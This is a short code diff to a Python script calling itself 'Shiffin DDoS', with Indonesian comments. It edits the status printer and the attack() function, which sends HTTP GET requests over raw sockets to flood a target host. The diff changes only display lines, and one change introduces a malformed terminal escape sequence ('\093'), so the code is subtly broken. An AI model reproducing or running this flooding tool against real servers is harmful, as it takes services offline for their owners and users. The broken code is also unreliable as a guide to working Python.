@@ -79,7 +79,7 @@ def print_status():
     thread_num += 1
     #print output pada baris yang sama
     sys.stdout.write(f" {time.ctime().split()[3]} [{str(thread_num)}]")
-    print(f"\033[96m{0} Shiffin DDoS\033[0m" ====>> f"\033[93msedang mengirimkan paket|\033[0m".format(round))
+    print(f"\033[96m{0} Shiffin DDoS\033[0m" f"\033[93msedang mengirimkan paket|\033[0m".format(round))
     sys.stdout.flush()
     thread_num_mutex.release()
 
@@ -107,7 +107,7 @@ def attack():
         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
-        print (f"\033[1m [ No connection, server may be down ]: {str(socket.error)}\033[0m")
+        print (f"\093[4m [ No connection, server may be down ]: {str(socket.error)}\033[0m")
     finally:
         # Tutup soket dengan rapi
         dos.shutdown(socket.SHUT_RDWR)
